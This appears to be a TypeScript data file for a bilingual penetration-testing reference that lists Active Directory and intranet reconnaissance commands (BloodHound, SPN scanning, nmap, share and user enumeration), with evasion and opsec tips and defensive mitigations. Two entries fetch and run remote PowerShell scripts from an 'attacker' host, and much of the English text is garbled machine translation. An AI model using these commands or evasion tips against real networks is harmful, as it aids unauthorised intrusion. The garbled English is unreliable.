import type { PayloadItem } from '../types';

export const intranetPayloads: PayloadItem[] = [
  // ==================== 信息收集 ====================
  {
    id: 'bloodhound-enumeration',
    name: { zh: 'BloodHound域分析', en: 'BloodHound Domain Analysis' },
    description: { zh: '使用BloodHound分析Active Directory攻击路径', en: 'UseBloodHoundAnalyzeActive DirectoryAttackPath' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '域分析', en: 'Domain Analysis' },
    tags: ['bloodhound', 'active-directory', 'enumeration', 'neo4j'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '域用户凭证', en: 'Domain UsersCredentials' }, { zh: 'BloodHound工具', en: 'BloodHoundTools' }],
    execution: [
      {
        title: { zh: 'SharpHound采集', en: 'SharpHound Collection' },
        command: 'SharpHound.exe -c All',
        description: { zh: '使用SharpHound采集域信息', en: 'UseSharpHound CollectionDomain Info' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'SharpHound.exe', explanation: { zh: 'BloodHound数据采集工具', en: 'BloodHound data collection tool' }, type: 'command' },
          { part: '-c All', explanation: { zh: '采集所有类型的数据', en: 'Collect all types of data' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'PowerShell采集', en: 'PowerShell Collection' },
        command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All',
        description: { zh: '通过PowerShell远程加载采集', en: 'Remote collection via PowerShell' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Invoke-BloodHound', explanation: { zh: 'PowerShell版本的采集命令', en: 'PowerShell version of collection command' }, type: 'command' },
          { part: '-CollectionMethod', explanation: { zh: '指定采集方法', en: 'Specify collection method' }, type: 'parameter' }
        ]
      },
      {
        title: 'bloodhound-python',
        command: 'bloodhound-python -u user -p password -d target.com -ns dc_ip',
        description: { zh: '使用Python版本采集', en: 'Collection using Python version' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'bloodhound-python', explanation: { zh: 'Python版BloodHound采集器', en: 'Python version of BloodHound collector' }, type: 'command' },
          { part: '-u', explanation: { zh: '用户名', en: 'Username' }, type: 'parameter' },
          { part: '-d', explanation: { zh: '域名', en: 'Domain name' }, type: 'parameter' },
          { part: '-ns', explanation: { zh: '域名服务器', en: 'Domain Name Server' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '指定域控制器', en: 'Specify Domain Controller' },
        command: 'SharpHound.exe -c All --LdapUsername user --LdapPassword pass --DomainController dc.target.com',
        description: { zh: '指定域控制器采集', en: 'Target a specific domain controller for collection' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: '--LdapUsername', explanation: { zh: 'LDAP认证用户名', en: 'LDAP authentication username' }, type: 'parameter' },
          { part: '--DomainController', explanation: { zh: '指定域控制器', en: 'Specify Domain Controller' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '启动Neo4j', en: 'Start Neo4j' },
        command: 'sudo neo4j console',
        description: { zh: '启动Neo4j数据库', en: 'Start Neo4j database' },
        platform: 'linux'
      },
      {
        title: { zh: 'Cypher查询域管', en: 'Cypher query for Domain Admins' },
        command: 'MATCH (n:User) WHERE n.admincount=true RETURN n',
        description: { zh: '查询域管理员用户', en: 'QueryDomain AdminsUsers' },
        platform: 'all'
      },
      {
        title: { zh: '查询攻击路径', en: 'QueryAttackPath' },
        command: 'MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p',
        description: { zh: '查询到域管理员的最短路径', en: 'Shortest path to Domain Admins' },
        platform: 'all'
      }
    ],
    edrBypass: [
      {
        title: { zh: '隐蔽采集', en: 'Stealthy collection' },
        command: 'SharpHound.exe -c All --LdapUsername user --LdapPassword pass --OutputDirectory C:\\Users\\Public --RandomizeFilenames',
        description: { zh: '随机化文件名避免检测', en: 'Randomize filename to avoid detection' }
      }
    ],
    analysis: { zh: 'BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。', en: 'BloodHound can discover attack paths within the domain, such as privilege escalation paths, session information, and group relationships.' },
    opsecTips: [{ zh: 'BloodHound采集会产生大量LDAP查询', en: 'BloodHound collection generates a large volume of LDAP queries' }, { zh: '可能触发域控制器告警', en: 'PossibleTriggerDomainControllerAlert' }, { zh: '建议在非工作时间执行', en: 'Recommended to run during non-business hours' }],
    tutorial: {
      overview: { zh: 'BloodHound是一款用于分析Active Directory信任关系的工具，可以可视化攻击路径，帮助发现权限提升机会。', en: 'BloodHound is a tool for analyzing Active Directory trust relationships, capable of visualizing attack paths and discovering privilege escalation opportunities.' },
      vulnerability: { zh: 'Active Directory的复杂信任关系可能导致意外的权限提升路径，BloodHound可以发现这些路径。', en: 'Complex trust relationships in Active Directory may lead to unexpected privilege escalation paths, which BloodHound can uncover.' },
      exploitation: { zh: '利用流程：1) 采集域信息；2) 导入BloodHound；3) 分析攻击路径；4) 发现权限提升机会；5) 执行攻击。', en: 'Exploitation workflow: 1) Collect domain information; 2) Import into BloodHound; 3) Analyze attack paths; 4) Identify privilege escalation opportunities; 5) Execute the attack.' },
      mitigation: { zh: '防御措施：1) 定期审计AD权限；2) 最小权限原则；3) 监控异常LDAP查询；4) 清理不必要的信任关系。', en: 'Defenses: 1) Regularly audit AD permissions; 2) Apply the principle of least privilege; 3) Monitor anomalous LDAP queries; 4) Remove unnecessary trust relationships.' },
      difficulty: 'intermediate'
    }
  },
  {
    id: 'spn-scan',
    name: { zh: 'SPN扫描', en: 'SPN Scanning' },
    description: { zh: '扫描域内服务主体名称', en: 'Scan for Service Principal Names (SPNs) in the domain' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: 'SPN',
    tags: ['spn', 'kerberos', 'enumeration'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '查询所有SPN', en: 'QueryallSPN' },
        command: 'setspn -T domain.com -Q */*',
        description: { zh: '查询域内所有SPN', en: 'QueryDomainInsideallSPN' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'setspn', explanation: { zh: 'Service Principal Name工具', en: 'Service Principal NameTools' }, type: 'command' },
          { part: '-T', explanation: { zh: '指定域', en: 'Specify Domain' }, type: 'parameter' },
          { part: '-Q', explanation: { zh: '查询模式', en: 'QueryMode' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'PowerShell查询', en: 'PowerShellQuery' },
        command: 'Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName',
        description: { zh: 'PowerShell查询SPN用户', en: 'PowerShellQuerySPNUsers' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'Get-ADUser', explanation: { zh: '获取AD用户命令', en: 'ObtainADUsersCommand' }, type: 'command' },
          { part: '-Filter', explanation: { zh: '过滤条件', en: 'FilterCondition' }, type: 'parameter' },
          { part: '-Properties', explanation: { zh: '返回的属性', en: 'Return property' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Impacket查询', en: 'ImpacketQuery' },
        command: 'GetUserSPNs.py domain/user:password -dc-ip dc_ip',
        description: { zh: 'Impacket查询SPN', en: 'ImpacketQuerySPN' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'GetUserSPNs.py', explanation: { zh: 'Impacket SPN查询工具', en: 'Impacket SPNQueryTools' }, type: 'command' },
          { part: '-dc-ip', explanation: { zh: '域控制器IP', en: 'DomainControllerIP' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '查询特定服务', en: 'QueryspecificService' },
        command: 'setspn -T domain.com -Q HTTP/*',
        description: { zh: '查询HTTP服务的SPN', en: 'QueryHTTPService SPN' },
        platform: 'windows'
      },
      {
        title: { zh: '查找SQL服务', en: 'FindSQLService' },
        command: 'setspn -T domain.com -Q MSSQLSvc/*',
        description: { zh: '查询MSSQL服务的SPN', en: 'QueryMSSQLService SPN' },
        platform: 'windows'
      }
    ],
    analysis: { zh: 'SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。', en: 'SPN scanning reveals service accounts running in the domain, laying the groundwork for Kerberoasting attacks.' },
    opsecTips: [{ zh: 'SPN查询是正常的域操作', en: 'SPNQuery is normal Domainoperation' }, { zh: '不会触发明显告警', en: 'Does not trigger obvious alerts' }, { zh: '可用于后续Kerberoasting攻击', en: 'Can be used for subsequent Kerberoasting attacks' }],
    tutorial: {
      overview: { zh: 'SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。', en: 'SPN scanning reveals service accounts running in the domain, laying the groundwork for Kerberoasting attacks.' },
      vulnerability: { zh: 'SPN是Kerberos认证的一部分，攻击者可以通过SPN找到高价值的服务账户。', en: 'SPNs are part of Kerberos authentication; attackers can use them to locate high-value service accounts.' },
      exploitation: { zh: '利用流程：1) 扫描SPN；2) 识别高价值账户；3) 请求Kerberos票据；4) 离线破解。', en: 'Exploitation workflow: 1) Scan for SPNs; 2) Identify high-value accounts; 3) Request Kerberos tickets; 4) Crack offline.' },
      mitigation: { zh: '防御措施：1) 服务账户使用强密码；2) 监控异常的SPN查询；3) 定期审计SPN账户。', en: 'Defenses: 1) Use strong passwords for service accounts; 2) Monitor anomalous SPN queries; 3) Regularly audit SPN-associated accounts.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'port-scan',
    name: { zh: '内网端口扫描', en: 'Intranet Port Scanning' },
    description: { zh: '内网端口扫描与服务识别', en: 'Intranet Port Scanning and ServiceIdentify' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '端口扫描', en: 'Port Scanning' },
    tags: ['nmap', 'port-scan', 'enumeration'],
    prerequisites: [{ zh: '内网访问权限', en: 'Internal networkAccessPermission' }, { zh: '扫描工具', en: 'ScanTools' }],
    execution: [
      {
        title: { zh: '快速扫描', en: 'Fast Scan' },
        command: 'nmap -sS -T4 -F 192.168.1.0/24',
        description: { zh: '快速扫描常用端口', en: 'Fast ScanCommonPort' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-sS', explanation: { zh: 'SYN扫描，半开放扫描', en: 'SYN scan (half-open scan)' }, type: 'parameter' },
          { part: '-T4', explanation: { zh: '扫描速度模板(0-5)', en: 'Scan timing template (0-5)' }, type: 'parameter' },
          { part: '-F', explanation: { zh: '快速模式，只扫常用端口', en: 'Fast mode — scan common ports only' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '全端口扫描', en: 'Full Port Scanning' },
        command: 'nmap -sS -p- 192.168.1.1',
        description: { zh: '扫描所有65535端口', en: 'Scanall65535Port' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-p-', explanation: { zh: '扫描所有端口(1-65535)', en: 'ScanallPort(1-65535)' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '服务识别', en: 'ServiceIdentify' },
        command: 'nmap -sV -sC 192.168.1.1',
        description: { zh: '服务版本探测和脚本扫描', en: 'Service Version Detection and Script Scan' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-sV', explanation: { zh: '服务版本探测', en: 'Service Version Detection' }, type: 'parameter' },
          { part: '-sC', explanation: { zh: '使用默认脚本扫描', en: 'UseDefaultScript Scan' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '内网存活探测', en: 'Internal networkAlive Detection' },
        command: 'nmap -sn 192.168.1.0/24',
        description: { zh: 'Ping扫描发现存活主机', en: 'Ping scan to discover live hosts' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-sn', explanation: { zh: 'Ping扫描，不进行端口扫描', en: 'PingScan, not perform Port Scanning' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'Masscan快速扫描', en: 'MasscanFast Scan' },
        command: 'masscan -p1-65535 192.168.1.0/24 --rate=1000',
        description: { zh: '高速端口扫描', en: 'High-Speed Port Scanning' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'masscan', explanation: { zh: '高速端口扫描工具', en: 'High-speed port scanning tool' }, type: 'command' },
          { part: '--rate', explanation: { zh: '扫描速率(包/秒)', en: 'Scan rate (packets/sec)' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '操作系统识别', en: 'Operating SystemIdentify' },
        command: 'nmap -O 192.168.1.1',
        description: { zh: '识别目标操作系统', en: 'IdentifyTargetOperating System' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-O', explanation: { zh: '操作系统探测', en: 'OS Detection' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'UDP扫描', en: 'UDP Scan' },
        command: 'nmap -sU --top-ports 20 192.168.1.1',
        description: { zh: '扫描常用UDP端口', en: 'ScanCommonUDPPort' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '-sU', explanation: { zh: 'UDP扫描', en: 'UDP Scan' }, type: 'parameter' },
          { part: '--top-ports', explanation: { zh: '扫描最常用的N个端口', en: 'Scan the top N most common ports' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '漏洞扫描', en: 'VulnerabilityScan' },
        command: 'nmap --script vuln 192.168.1.1',
        description: { zh: '使用漏洞扫描脚本', en: 'UseVulnerabilityScanScript' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: '--script vuln', explanation: { zh: '使用漏洞类别脚本', en: 'Run vulnerability category scripts' }, type: 'parameter' }
        ]
      }
    ],
    edrBypass: [
      {
        title: { zh: '隐蔽扫描', en: 'StealthyScan' },
        command: 'nmap -sS -T2 -f --data-length 50 192.168.1.1',
        description: { zh: '低速分片扫描，添加随机数据', en: 'Low-speed fragmented scan with random data padding' }
      },
      {
        title: { zh: '诱饵扫描', en: 'Decoy scan' },
        command: 'nmap -sS -D RND:10 192.168.1.1',
        description: { zh: '使用诱饵IP混淆扫描来源', en: 'Use decoy IPs to obfuscate the scan source' }
      }
    ],
    analysis: { zh: '端口扫描可以发现内网中开放的服务，识别潜在的攻击目标。', en: 'Port scanning reveals open services on the internal network and identifies potential attack targets.' },
    opsecTips: [{ zh: '高速扫描可能触发IDS告警', en: 'High-speed scans may trigger IDS alerts' }, { zh: '建议使用较低速率', en: 'Use a lower scan rate to stay under the radar' }, { zh: '分时段进行扫描', en: 'Spread scans across different time windows' }],
    tutorial: {
      overview: { zh: '端口扫描是内网渗透的第一步，用于发现开放的服务和潜在的攻击面。', en: 'Port scanning is the first step in intranet penetration, used to discover open services and potential attack surfaces.' },
      vulnerability: { zh: '内网中可能存在未打补丁的服务或配置不当的服务。', en: 'The internal network may harbor unpatched or misconfigured services.' },
      exploitation: { zh: '利用流程：1) 发现存活主机；2) 扫描开放端口；3) 识别服务版本；4) 寻找漏洞利用。', en: 'Exploitation workflow: 1) Discover live hosts; 2) Scan open ports; 3) Identify service versions; 4) Find and exploit vulnerabilities.' },
      mitigation: { zh: '防御措施：1) 关闭不必要的服务；2) 配置防火墙规则；3) 监控异常扫描行为。', en: 'Defensemeasures: 1) Close not Necessary Service; 2) ConfigurationFirewallRule; 3) MonitoringExceptionScanbehavior.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'domain-recon',
    name: { zh: '域信息收集', en: 'Domain Information Gathering' },
    description: { zh: 'Active Directory域环境信息收集', en: 'Active DirectoryDomainEnvironmentInformation Gathering' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '域信息', en: 'Domain Info' },
    tags: ['active-directory', 'domain', 'enumeration'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '域信息', en: 'Domain Info' },
        command: 'net config workstation',
        description: { zh: '获取域信息', en: 'Get Domain Info' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'net config', explanation: { zh: '显示配置信息', en: 'DisplayConfigurationInformation' }, type: 'command' },
          { part: 'workstation', explanation: { zh: '工作站配置', en: 'Workstation configuration' }, type: 'value' }
        ]
      },
      {
        title: { zh: '域控制器', en: 'DomainController' },
        command: 'nltest /dclist:domain.com',
        description: { zh: '列出域控制器', en: 'ListDomainController' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'nltest', explanation: { zh: 'Windows域工具', en: 'WindowsDomainTools' }, type: 'command' },
          { part: '/dclist', explanation: { zh: '列出域控制器', en: 'ListDomainController' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '域用户', en: 'Domain Users' },
        command: 'net user /domain',
        description: { zh: '列出域用户', en: 'ListDomain Users' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'net user', explanation: { zh: '用户管理命令', en: 'User ManagementCommand' }, type: 'command' },
          { part: '/domain', explanation: { zh: '指定域环境', en: 'Specify DomainEnvironment' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '域管理员', en: 'Domain Admins' },
        command: 'net group "Domain Admins" /domain',
        description: { zh: '列出域管理员组', en: 'ListDomain AdminsGroups' },
        platform: 'windows'
      },
      {
        title: { zh: '域信任关系', en: 'DomainTrust Relationships' },
        command: 'nltest /domain_trusts',
        description: { zh: '列出域信任关系', en: 'ListDomainTrust Relationships' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView收集', en: 'PowerViewCollect' },
        command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1"); Get-NetDomain',
        description: { zh: '使用PowerView收集域信息', en: 'UsePowerViewCollectDomain Info' },
        platform: 'windows'
      },
      {
        title: { zh: '获取域策略', en: 'ObtainDomainStrategy' },
        command: 'Get-DomainPolicy',
        description: { zh: '获取域密码策略', en: 'ObtainDomainPassword Policy' },
        platform: 'windows'
      },
      {
        title: { zh: '获取域控制器', en: 'Get domain controllers' },
        command: 'Get-NetDomainController',
        description: { zh: '获取域控制器信息', en: 'Get domain controller information' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。', en: 'Domain information gathering is foundational to intranet penetration — it reveals the domain structure, users, groups, and more.' },
    opsecTips: [{ zh: '域信息收集是正常操作', en: 'Domain Information Gathering is normaloperation' }, { zh: '不会触发明显告警', en: 'Does not trigger obvious alerts' }, { zh: '为后续攻击做准备', en: 'Preparation for subsequent attacks' }],
    tutorial: {
      overview: { zh: '域信息收集是内网渗透的基础，可以了解域结构、用户、组等信息。', en: 'Domain information gathering is foundational to intranet penetration — it reveals the domain structure, users, groups, and more.' },
      vulnerability: { zh: 'Active Directory默认允许普通用户查询大部分域信息。', en: 'Active Directory allows regular users to query most domain information by default.' },
      exploitation: { zh: '利用流程：1) 获取域信息；2) 识别高价值目标；3) 规划攻击路径；4) 执行攻击。', en: 'Exploitation workflow: 1) Gather domain information; 2) Identify high-value targets; 3) Plan attack paths; 4) Execute the attack.' },
      mitigation: { zh: '防御措施：1) 限制LDAP查询权限；2) 监控异常查询；3) 实施最小权限原则。', en: 'Defensemeasures: 1) RestrictLDAP QueryPermission; 2) MonitoringExceptionQuery; 3) ImplementMinimumPermissionOriginal then .' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'network-recon',
    name: { zh: '网络信息收集', en: 'Network Information Gathering' },
    description: { zh: '内网网络拓扑和配置信息收集', en: 'Internal network topology and configuration reconnaissance' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '网络信息', en: 'Network Info' },
    tags: ['network', 'enumeration', 'topology'],
    prerequisites: [{ zh: '内网访问权限', en: 'Internal networkAccessPermission' }],
    execution: [
      {
        title: { zh: '网络配置', en: 'Network Configuration' },
        command: 'ipconfig /all',
        description: { zh: '查看网络配置', en: 'View network configuration' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'ipconfig', explanation: { zh: '网络配置命令', en: 'Network ConfigurationCommand' }, type: 'command' },
          { part: '/all', explanation: { zh: '显示详细信息', en: 'Display detailed information' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: '路由表', en: 'Routing table' },
        command: 'route print',
        description: { zh: '查看路由表', en: 'View routing table' },
        platform: 'windows'
      },
      {
        title: { zh: 'ARP缓存', en: 'ARPCache' },
        command: 'arp -a',
        description: { zh: '查看ARP缓存', en: 'View ARP cache' },
        platform: 'windows'
      },
      {
        title: { zh: '网络连接', en: 'Network Connections' },
        command: 'netstat -ano',
        description: { zh: '查看网络连接', en: 'View network connections' },
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'netstat', explanation: { zh: '网络统计命令', en: 'Network statistics command' }, type: 'command' },
          { part: '-a', explanation: { zh: '显示所有连接', en: 'DisplayallConnection' }, type: 'parameter' },
          { part: '-n', explanation: { zh: '以数字形式显示地址', en: 'Display addresses in numeric form' }, type: 'parameter' },
          { part: '-o', explanation: { zh: '显示进程ID', en: 'DisplayProcessID' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'DNS缓存', en: 'DNSCache' },
        command: 'ipconfig /displaydns',
        description: { zh: '查看DNS缓存', en: 'View DNS cache' },
        platform: 'windows'
      },
      {
        title: { zh: 'Linux网络配置', en: 'LinuxNetwork Configuration' },
        command: 'ifconfig -a',
        description: { zh: 'Linux查看网络配置', en: 'View network configuration on Linux' },
        platform: 'linux'
      },
      {
        title: { zh: 'Linux路由表', en: 'LinuxRouting table' },
        command: 'route -n',
        description: { zh: 'Linux查看路由表', en: 'View routing table on Linux' },
        platform: 'linux'
      },
      {
        title: 'traceroute',
        command: 'tracert target_ip',
        description: { zh: '追踪路由', en: 'Traceroute' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '网络信息收集可以了解内网拓扑、网段划分、网关等信息。', en: 'Network reconnaissance reveals the internal topology, subnet segmentation, gateways, and other key information.' },
    opsecTips: [{ zh: '这些是正常的网络管理命令', en: 'These are normal network administration commands' }, { zh: '不会触发告警', en: 'not WillTriggerAlert' }, { zh: '为后续横向移动做准备', en: 'Preparation for subsequent lateral movement' }],
    tutorial: {
      overview: { zh: '网络信息收集可以了解内网拓扑、网段划分、网关等信息。', en: 'Network reconnaissance reveals the internal topology, subnet segmentation, gateways, and other key information.' },
      vulnerability: { zh: '内网中可能存在多个网段和信任关系，攻击者可以利用这些进行横向移动。', en: 'The internal network may contain multiple subnets and trust relationships that an attacker can leverage for lateral movement.' },
      exploitation: { zh: '利用流程：1) 收集网络信息；2) 绘制网络拓扑；3) 发现攻击路径；4) 横向移动。', en: 'Exploitation workflow: 1) Collect network information; 2) Map the network topology; 3) Discover attack paths; 4) Perform lateral movement.' },
      mitigation: { zh: '防御措施：1) 网络分段隔离；2) 限制跨网段访问；3) 监控异常网络行为。', en: 'Defenses: 1) Network segmentation and isolation; 2) Restrict cross-subnet access; 3) Monitor anomalous network behavior.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'share-enum',
    name: { zh: '共享枚举', en: 'Share Enumeration' },
    description: { zh: '枚举网络共享资源', en: 'EnumerationNetworkSharesResource' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '共享', en: 'Shares' },
    tags: ['smb', 'share', 'enumeration'],
    prerequisites: [{ zh: '内网访问权限', en: 'Internal networkAccessPermission' }],
    execution: [
      {
        title: { zh: '枚举共享', en: 'EnumerationShares' },
        command: 'net share',
        description: { zh: '查看本地共享', en: 'View local shares' },
        platform: 'windows'
      },
      {
        title: { zh: '查看远程共享', en: 'View remote shares' },
        command: 'net view \\\\target_ip',
        description: { zh: '查看远程机器共享', en: 'View remote machine shares' },
        platform: 'windows'
      },
      {
        title: { zh: 'SMBMap枚举', en: 'SMBMapEnumeration' },
        command: 'smbmap -H target_ip -u user -p password',
        description: { zh: '使用SMBMap枚举共享', en: 'UseSMBMapEnumerationShares' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'smbmap', explanation: { zh: 'SMB共享枚举工具', en: 'SMBShare EnumerationTools' }, type: 'command' },
          { part: '-H', explanation: { zh: '目标主机', en: 'TargetHost' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'CrackMapExec枚举', en: 'CrackMapExecEnumeration' },
        command: 'crackmapexec smb target_ip -u user -p password --shares',
        description: { zh: '使用CME枚举共享', en: 'UseCMEEnumerationShares' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'crackmapexec smb', explanation: { zh: 'CME SMB模块', en: 'CME SMBModule' }, type: 'command' },
          { part: '--shares', explanation: { zh: '枚举共享', en: 'EnumerationShares' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'smbclient枚举', en: 'smbclientEnumeration' },
        command: 'smbclient -L target_ip -U user%password',
        description: { zh: '使用smbclient枚举', en: 'UsesmbclientEnumeration' },
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'smbclient', explanation: { zh: 'SMB客户端工具', en: 'SMBClientTools' }, type: 'command' },
          { part: '-L', explanation: { zh: '列出共享', en: 'List Shares' }, type: 'parameter' }
        ]
      },
      {
        title: { zh: 'PowerView枚举', en: 'PowerViewEnumeration' },
        command: 'Find-InterestingDomainShareFile',
        description: { zh: '查找有趣的共享文件', en: 'Find interesting shared files' },
        platform: 'windows'
      }
    ],
    analysis: { zh: '共享枚举可以发现敏感文件、配置文件、备份文件等有价值的信息。', en: 'Share enumeration can uncover sensitive files, configuration files, backups, and other valuable information.' },
    opsecTips: [{ zh: '共享枚举是正常操作', en: 'Share Enumeration is normaloperation' }, { zh: '可能发现敏感文件', en: 'PossibleDiscoverSensitive Files' }, { zh: '注意文件访问日志', en: 'NoteFile AccessLog' }],
    tutorial: {
      overview: { zh: '共享枚举可以发现网络中的共享资源，可能包含敏感文件。', en: 'Share EnumerationcanDiscoverNetworkMiddle SharesResource, PossiblecontainsSensitive Files.' },
      vulnerability: { zh: '企业网络中经常存在配置不当的共享，包含敏感信息。', en: 'Enterprise networks often have misconfigured shares containing sensitive information.' },
      exploitation: { zh: '利用流程：1) 枚举共享；2) 访问共享；3) 搜索敏感文件；4) 获取凭证或信息。', en: 'Exploitationworkflow: 1) EnumerationShares; 2) AccessShares; 3) SearchSensitive Files; 4) ObtainCredentials or Information.' },
      mitigation: { zh: '防御措施：1) 审计共享权限；2) 移除不必要的共享；3) 监控共享访问。', en: 'Defensemeasures: 1) AuditSharesPermission; 2) Remove not Necessary Shares; 3) MonitoringSharesAccess.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'user-enum',
    name: { zh: '用户枚举', en: 'User Enumeration' },
    description: { zh: '枚举域内用户信息', en: 'EnumerationDomainInsideUser Info' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '用户', en: 'Users' },
    tags: ['user', 'enumeration', 'active-directory'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '列出域用户', en: 'ListDomain Users' },
        command: 'net user /domain',
        description: { zh: '列出所有域用户', en: 'ListallDomain Users' },
        platform: 'windows'
      },
      {
        title: { zh: '用户详细信息', en: 'User details' },
        command: 'net user username /domain',
        description: { zh: '查看用户详细信息', en: 'View user details' },
        platform: 'windows'
      },
      {
        title: { zh: 'PowerView枚举', en: 'PowerViewEnumeration' },
        command: 'Get-NetUser | select samaccountname,description,admincount',
        description: { zh: '使用PowerView枚举用户', en: 'UsePowerViewEnumerationUsers' },
        platform: 'windows'
      },
      {
        title: { zh: '查找管理员', en: 'Find Admins' },
        command: 'Get-NetUser -AdminCount | select samaccountname',
        description: { zh: '查找域管理员', en: 'FindDomain Admins' },
        platform: 'windows'
      },
      {
        title: { zh: '查找活跃用户', en: 'Find active users' },
        command: 'Get-NetUser | Where-Object {$_.lastlogon -gt (Get-Date).AddDays(-30)}',
        description: { zh: '查找最近登录的用户', en: 'Find recently logged-in users' },
        platform: 'windows'
      },
      {
        title: { zh: 'Impacket枚举', en: 'ImpacketEnumeration' },
        command: 'GetADUsers.py -all domain/user:password -dc-ip dc_ip',
        description: { zh: '使用Impacket枚举域用户', en: 'UseImpacketEnumerationDomain Users' },
        platform: 'linux'
      }
    ],
    analysis: { zh: '用户枚举可以发现高价值目标、活跃用户、服务账户等。', en: 'User enumeration reveals high-value targets, active users, service accounts, and more.' },
    opsecTips: [{ zh: '用户枚举是正常操作', en: 'User Enumeration is normaloperation' }, { zh: '为后续攻击选择目标', en: 'Select targets for subsequent attacks' }, { zh: '注意识别蜜罐账户', en: 'Watch out for honeypot accounts' }],
    tutorial: {
      overview: { zh: '用户枚举可以发现域内所有用户，识别高价值目标。', en: 'User enumeration discovers all users in the domain and identifies high-value targets.' },
      vulnerability: { zh: 'Active Directory允许普通用户查询用户信息。', en: 'Active Directory allows regular users to query user information.' },
      exploitation: { zh: '利用流程：1) 枚举用户；2) 识别高价值目标；3) 针对性攻击；4) 获取凭证。', en: 'Exploitation workflow: 1) Enumerate users; 2) Identify high-value targets; 3) Launch targeted attacks; 4) Obtain credentials.' },
      mitigation: { zh: '防御措施：1) 限制用户属性查询；2) 部署蜜罐账户；3) 监控异常查询。', en: 'Defenses: 1) Restrict user attribute queries; 2) Deploy honeypot accounts; 3) Monitor anomalous queries.' },
      difficulty: 'beginner'
    }
  },
  {
    id: 'group-enum',
    name: { zh: '组枚举', en: 'Group Enumeration' },
    description: { zh: '枚举域内组信息', en: 'EnumerationDomainInsideGroupsInformation' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    subCategory: { zh: '组', en: 'Groups' },
    tags: ['group', 'enumeration', 'active-directory'],
    prerequisites: [{ zh: '域环境', en: 'DomainEnvironment' }, { zh: '任意域用户凭证', en: 'ArbitraryDomain UsersCredentials' }],
    execution: [
      {
        title: { zh: '列出域组', en: 'ListDomainGroups' },
        command: 'net group /domain',
        description: { zh: '列出所有域组', en: 'ListallDomainGroups' },
        platform: 'windows'
      },
      {
        title: { zh: '组成员', en: 'Group members' },
        command: 'net group "Domain Admins" /domain',
